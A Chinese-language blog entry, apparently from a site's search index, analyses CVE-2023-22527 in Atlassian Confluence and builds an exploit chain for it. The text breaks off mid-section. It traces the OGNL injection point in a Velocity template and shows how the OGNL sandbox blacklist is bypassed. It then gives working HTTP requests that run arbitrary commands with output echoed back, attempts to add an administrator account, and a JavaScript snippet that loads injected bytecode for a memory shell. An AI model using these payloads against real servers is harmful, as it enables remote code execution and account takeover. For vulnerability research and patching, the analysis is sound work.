<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2023-22527-confluecne 漏洞分析和利用链构造</title>
      <link href="/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/"/>
      <url>/2024/03/07/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><blockquote><p>[1] <a href="https://forum.butian.net/share/2741">https://forum.butian.net/share/2741</a><br>[2] bypass 沙箱： <a href="https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context">https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context</a><br>[3] <a href="https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2023-22527/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2023-22527/README.zh-cn.md</a><br>OGNL 沙箱利用<br>[4] <a href="https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/">https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/</a><br>前置漏洞<br>[5] CVE-2021-26084和CVE-2022-26134</p></blockquote><p>覆盖版本</p><ul><li>8.5.0 ≤ version ≤ 8.5.3</li><li>8.0.x，8.1.x，8.2.x，8.3.x，8.4.x</li></ul><h2 id="2-测试一下"><a href="#2-测试一下" class="headerlink" title="2. 测试一下"></a>2. 测试一下</h2><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092254527.png" alt="image-20240307092254527"></p><h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3. 漏洞分析"></a>3. 漏洞分析</h2><h3 id="3-1-text-inline-vm"><a href="#3-1-text-inline-vm" class="headerlink" title="3.1 text-inline.vm"></a>3.1 text-inline.vm</h3><p>存在漏洞点的模板，这样的漏洞点还有其他一些模板</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#set( $labelValue = $stack.findValue(&quot;getText(&#x27;$parameters.label&#x27;)&quot;) )</span><br><span class="line">#if( !$labelValue )</span><br><span class="line">    #set( $labelValue = $parameters.label )</span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line">#if (!$parameters.id)</span><br><span class="line">    #set( $parameters.id = $parameters.name)</span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line">&lt;label id=<span class="string">&quot;$&#123;parameters.id&#125;-label&quot;</span> <span class="keyword">for</span>=<span class="string">&quot;$parameters.id&quot;</span>&gt;</span><br><span class="line">$!labelValue</span><br><span class="line">#if($parameters.required)</span><br><span class="line">    &lt;span class=&quot;aui-icon icon-required&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;span class=&quot;content&quot;&gt;$parameters.required&lt;/span&gt;</span><br><span class="line">#end</span><br><span class="line">&lt;/label&gt;</span><br><span class="line"></span><br><span class="line">#parse(&quot;/template/aui/text-include.vm&quot;)</span><br></pre></td></tr></table></figure><p><code>.vm</code>请求由 <code>ConfluenceVelocityServlet</code> 处理<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093238153.png" alt="image-20240307093238153"><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092351860.png" alt="image-20240307092351860"></p><ul><li>获取模板</li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092410237.png" alt="image-20240307092410237"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Template <span class="title">getTemplate</span><span class="params">(String name, String encoding)</span> <span class="keyword">throws</span> ResourceNotFoundException, ParseErrorException, Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getVelocityManager().getVelocityEngine().getTemplate(name, encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>合并模板</li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092427369.png" alt="image-20240307092427369"><br>… 模板渲染过程省略</p><ul><li><p><code>$stack.findValue()</code>的表达式解析<br>:::success<br>ONGL 中$、#都可以内置对象和属性，内置对象。<br>:::</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#root：表示OGNL表达式的根对象。在一些情况下，如果需要访问整个对象图的根对象，可以使用#root。</span><br><span class="line">#this：表示当前正在处理的对象。在OGNL表达式中，#this可以用来引用当前正在处理的对象。</span><br><span class="line">#context：表示OGNL的上下文对象。在一些情况下，可能需要访问OGNL的上下文对象，比如在编写自定义函数时。</span><br><span class="line">#session：表示当前会话的会话对象。在Web应用中，可以使用#session来访问当前用户的会话信息。</span><br><span class="line">#request：表示当前HTTP请求对象。在Web应用中，可以使用#request来访问当前HTTP请求的参数和属性。</span><br><span class="line">#application：表示当前Web应用的应用对象。在Web应用中，可以使用#application来访问应用级别的参数和属性。</span><br><span class="line">#parameters：表示当前HTTP请求的参数映射。在Web应用中，可以使用#parameters来访问当前HTTP请求的参数。</span><br><span class="line">#attrs：表示当前HTTP请求的属性映射。在Web应用中，可以使用#attrs来访问当前HTTP请求的属性。</span><br><span class="line">#sessionScope、#requestScope、#applicationScope：分别表示会话、请求和应用作用域中的属性映射。这些属性可用于访问各个作用域中的属性。</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092441988.png" alt="image-20240307092441988"></p></li><li><p>invoke</p></li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092452639.png" alt="image-20240307092452639"></p><ul><li>模板中的漏洞点 <code>$stack.findValue</code></li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092504970.png" alt="image-20240307092504970"></p><ul><li>触发 Ognl 表达式解析</li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092517172.png" alt="image-20240307092517172"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">getValueUsingOgnl</span><span class="params">(String expr)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">    Object var2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = <span class="keyword">this</span>.ognlUtil.getValue(expr, <span class="keyword">this</span>.context, <span class="keyword">this</span>.root);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.context.remove(THROW_EXCEPTION_ON_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个 findValue 不一样，<br>第一次是<br><code>$stack.findValue()</code>获取的是<code>OgnlValueStack</code><br>在 findValue() -&gt; <code>getValueUsingOgnl</code> 测试表达式执行<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092529936.png" alt="image-20240307092529936"><br>这里不能使用 <code>$&#123;&#125;</code>包裹，可以使用<code>#&#123;&#125;</code><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092539244.png" alt="image-20240307092539244"><br>第二次是<br><code>#request.get(&#39;.KEY_velocity.struts2.context&#39;).internalGet(&#39;ognl&#39;)</code>获取的是OgnlTool</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&#x27;+#request.get(&#x27;</span>.KEY_velocity.struts2.context<span class="string">&#x27;).internalGet(&#x27;</span>ognl<span class="string">&#x27;).findValue(#parameters.poc[0],&#123;&#125;)+&#x27;</span>&amp;poc=xxxx</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092556068.png" alt="image-20240307092556068"></p><h3 id="3-2-RCE"><a href="#3-2-RCE" class="headerlink" title="3.2 RCE"></a>3.2 RCE</h3><p>上面已经找到了 Ongl 表达式注入的地方，但是还不能直接RCE，参考链接[2]<br>在 [2] 中有一个列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">For Freemarker:</span><br><span class="line"></span><br><span class="line">.freemarker.Request (freemarker.ext.servlet.HttpRequestHashModel)</span><br><span class="line">.freemarker.TemplateModel (org.apache.struts2.views.freemarker.ScopesHashModel)</span><br><span class="line">__FreeMarkerServlet.Application__ (freemarker.ext.servlet.ServletContextHashModel)</span><br><span class="line">JspTaglibs (freemarker.ext.jsp.TaglibFactory)</span><br><span class="line">.freemarker.RequestParameters (freemarker.ext.servlet.HttpRequestParametersHashModel)</span><br><span class="line">.freemarker.Request (freemarker.ext.servlet.HttpRequestHashModel)</span><br><span class="line">.freemarker.Application (freemarker.ext.servlet.ServletContextHashModel)</span><br><span class="line">.freemarker.JspTaglibs (freemarker.ext.jsp.TaglibFactory)</span><br><span class="line">ognl (org.apache.struts2.views.jsp.ui.OgnlTool)</span><br><span class="line">stack (com.opensymphony.xwork2.ognl.OgnlValueStack)</span><br><span class="line">struts (org.apache.struts2.util.StrutsUtil)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">For JSPs:</span><br><span class="line"></span><br><span class="line">com.opensymphony.xwork2.dispatcher.PageContext (PageContextImpl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">For Velocity:</span><br><span class="line"></span><br><span class="line">.KEY_velocity.struts2.context -&gt; (StrutsVelocityContext)</span><br><span class="line">ognl (org.apache.struts2.views.jsp.ui.OgnlTool)</span><br><span class="line">struts (org.apache.struts2.views.velocity.result.VelocityStrutsUtils)</span><br></pre></td></tr></table></figure><p>引用[2]<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093308942.png" alt="image-20240307093308942"><br><code>OgnlTool#findValue</code>二次加载 <code>Ognl</code> 表达式<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092615933.png" alt="image-20240307092615933"></p><blockquote><p>这里查看堆栈，有个<code>OgnlRuntime#invokeMethodInsideSandbox</code>方法引起注入，可会思考 <code>Ognl</code> 的加固方案</p></blockquote><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092625167.png" alt="image-20240307092625167"></p><h2 id="4-EXP"><a href="#4-EXP" class="headerlink" title="4. EXP"></a>4. EXP</h2><p>测试的 ognl 表达式如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@org</span>.apache. struts2.ServletActionContext<span class="meta">@getResponse()</span>.setHeader(<span class="string">&#x27;Cmd-Responses-Header&#x27;</span>,(<span class="keyword">new</span> freemarker.template.utility.Execute()).exec(&#123;<span class="string">&quot;id&quot;</span>&#125;))</span><br></pre></td></tr></table></figure><p>获取 <code>HttpServletResponse</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HttpServletResponse <span class="title">getResponse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (HttpServletResponse)ActionContext.getContext().get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092635746.png" alt="image-20240307092635746"></p><h3 id="4-1-命令执行拦截"><a href="#4-1-命令执行拦截" class="headerlink" title="4.1. 命令执行拦截"></a>4.1. 命令执行拦截</h3><p>但是当我使用传统的命令执行表达式时，触发安全拦截</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;touch /tmp/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092646368.png" alt="image-20240307092646368"></p><ul><li>子节点 getValue</li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092658143.png" alt="image-20240307092658143"></p><ul><li>反射调用方法的代码段</li></ul><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092707896.png" alt="image-20240307092707896"></p><ul><li>安全拦截</li></ul><p>可以看到这里做了一些限制，其中就禁用了一些黑名单类，比如 <code>ClassResolver</code>、<code>ClassLoader</code>、<code>ProcessBuilder</code>、<code>Runtime</code>等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_useStricterInvocation) &#123;</span><br><span class="line">    Class methodDeclaringClass = method.getDeclaringClass();</span><br><span class="line">    <span class="keyword">if</span> (AO_SETACCESSIBLE_REF != <span class="keyword">null</span> &amp;&amp; AO_SETACCESSIBLE_REF.equals(method) || AO_SETACCESSIBLE_ARR_REF != <span class="keyword">null</span> &amp;&amp; AO_SETACCESSIBLE_ARR_REF.equals(method) || SYS_EXIT_REF != <span class="keyword">null</span> &amp;&amp; SYS_EXIT_REF.equals(method) || SYS_CONSOLE_REF != <span class="keyword">null</span> &amp;&amp; SYS_CONSOLE_REF.equals(method) || AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) || ClassResolver.class.isAssignableFrom(methodDeclaringClass) || MethodAccessor.class.isAssignableFrom(methodDeclaringClass) || MemberAccess.class.isAssignableFrom(methodDeclaringClass) || OgnlContext.class.isAssignableFrom(methodDeclaringClass) || Runtime.class.isAssignableFrom(methodDeclaringClass) || ClassLoader.class.isAssignableFrom(methodDeclaringClass) || ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) || AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessException(<span class="string">&quot;Method [&quot;</span> + method + <span class="string">&quot;] cannot be called from within OGNL invokeMethod() &quot;</span> + <span class="string">&quot;under stricter invocation mode.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092718021.png" alt="image-20240307092718021"><br>这个限制默认开启<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092755873.png" alt="image-20240307092755873"></p><h3 id="4-2-绕过黑名单限制"><a href="#4-2-绕过黑名单限制" class="headerlink" title="4.2. 绕过黑名单限制"></a>4.2. 绕过黑名单限制</h3><p>Poc 中使用 freemarker 的命令执行进行绕过，绕过黑名单即可</p><ul><li>freemarker</li><li>ScriptEngineManager</li><li>groovy</li></ul><p><code>freemarker</code> 命令执行<br><code>freemarker.template.utility.Execute()</code><br><code>ScriptEngineManager</code></p><h3 id="4-3-回显"><a href="#4-3-回显" class="headerlink" title="4.3. 回显"></a>4.3. 回显</h3><p>！直接构造回显， Poc回显会触发长度限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="string">&#x27;js&#x27;</span>).eval(<span class="string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;var c=com.atlassian.core.filters.ServletContextThreadLocal.getRequest().getHeader(&#x27;</span>Token<span class="string">&#x27;);var x=java.lang.Runtime.getRuntime().exec(c);var out=com.atlassian.core.filters.ServletContextThreadLocal.getResponse().getOutputStream();org.apache.commons.io.IOUtils.copy(x.getInputStream(),out);out.flush();out.close();&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092806193.png" alt="image-20240307092806193"><br>抛出长度限制的异常，最长的长度只能是 200<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092815918.png" alt="image-20240307092815918"><br>思路：通过 <code>Request</code> 参数传递 JS<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093400959.png" alt="image-20240307093400959"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>603</span><br><span class="line"><span class="attribute">Token</span><span class="punctuation">: </span>whoami</span><br><span class="line"></span><br><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=new javax.script.ScriptEngineManager().getEngineByName(&#x27;js&#x27;).eval(@org.apache.struts2.ServletActionContext@getRequest().getParameter(&#x27;js&#x27;))&amp;js=var c=com.atlassian.core.filters.ServletContextThreadLocal.getRequest().getHeader(&#x27;Token&#x27;);var x=java.lang.Runtime.getRuntime().exec(c);var out=com.atlassian.core.filters.ServletContextThreadLocal.getResponse().getOutputStream();org.apache.commons.io.IOUtils.copy(x.getInputStream(),out);out.flush();out.close();</span><br></pre></td></tr></table></figure><p>内存马嵌套<code>ScriptEngineManager</code>内存马即可，集成到插件</p><h3 id="4-4-添加管理员失败及绕过思路"><a href="#4-4-添加管理员失败及绕过思路" class="headerlink" title="4.4. 添加管理员失败及绕过思路"></a>4.4. 添加管理员失败及绕过思路</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=@com.atlassian.confluence.util.GeneralUtil@getUserAccessor().addUser(&#x27;HWatlassian&#x27;,&#x27;atlassian&#x27;,&#x27;admin@atlassian.com&#x27;,&#x27;atlassian&#x27;)</span><br></pre></td></tr></table></figure><p>使用这个 Poc（没有配置所属管理员组），已经报错了，提示没有权限；<strong>看来已经修复了这个利用方式</strong><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092833894.png" alt="image-20240307092833894"><br>查看<code>com/atlassian/confluence/user/DefaultUserAccessor.class#createUser</code>，方法中已经添加了<strong>用户身份校验；且其他用户有关方法都添加了权限校验</strong><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092848609.png" alt="image-20240307092848609"><br>但是这个方法并不是最终添加用户的方法，因此绕过上面的权限校验的代码段就可以，考虑可以直接使用 <code>this.getUserManager().createUser()</code><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092910464.png" alt="image-20240307092910464"><br>构造了这样的代码，发送测试，发现并不行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>427</span><br><span class="line"></span><br><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=(#a=@com.atlassian.confluence.util.GeneralUtil@getUserAccessor()).(#b=new com.atlassian.user.impl.DefaultUser(&quot;atlassian1&quot;, &quot;atlassian1&quot;, &quot;admin@atlassian.com&quot;)).(#c=@com.atlassian.user.security.password.Credential@unencrypted(&quot;1qaz@WSX&quot;)).(#a.getUserManager().createUser(#b,#c))</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092921491.png" alt="image-20240307092921491"><br>报错显示，无法获取 <code>getUserManager</code> 方法<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092933765.png" alt="image-20240307092933765"><br>因为获取的是代理类，不能转换为 <code>DefaultUserAccessor</code>，不能使用继承类的方法<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092944601.png" alt="image-20240307092944601"><br>可以看到是从 Spring 容器中获取的 <code>userAccessor</code>；<br>这里正好找到 userAccessorTarget，可以通过 <code>DefaultUserAccessor dua = (DefaultUserAccessor)ContainerManager.getComponent(&quot;userAccessorTarget&quot;);</code>获取对应的 bean 对象<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092955327.png" alt="image-20240307092955327"></p><p>通过各种构造，但是 js 这种弱语言构造问题太多，前置类型转换就存在问题，因此考虑还是直接加载字节码更灵活一些</p><h3 id="4-5-加载字节码"><a href="#4-5-加载字节码" class="headerlink" title="4.5. 加载字节码"></a>4.5. 加载字节码</h3><p>正常情况下，通过如下代码就可以实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64(<span class="string">&#x27;&#123;replace&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> classLoader = java.lang.Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = classLoader.loadClass(<span class="string">&#x27;&#123;replace&#125;&#x27;</span>);</span><br><span class="line">    clazz.newInstance();</span><br><span class="line">&#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">    <span class="keyword">var</span> method = java.lang.ClassLoader.class.getDeclaredMethod(<span class="string">&#x27;defineClass&#x27;</span>, <span class="string">&#x27;&#x27;</span>.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);</span><br><span class="line">    method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">var</span> clazz = method.invoke(classLoader, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">    clazz.newInstance();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="4-5-1-JDK9以上的一些限制"><a href="#4-5-1-JDK9以上的一些限制" class="headerlink" title="4.5.1 JDK9以上的一些限制"></a>4.5.1 JDK9以上的一些限制</h4><p>**这里又遇到了问题，由于confluence 测试的这个版本运行在 openjdk11 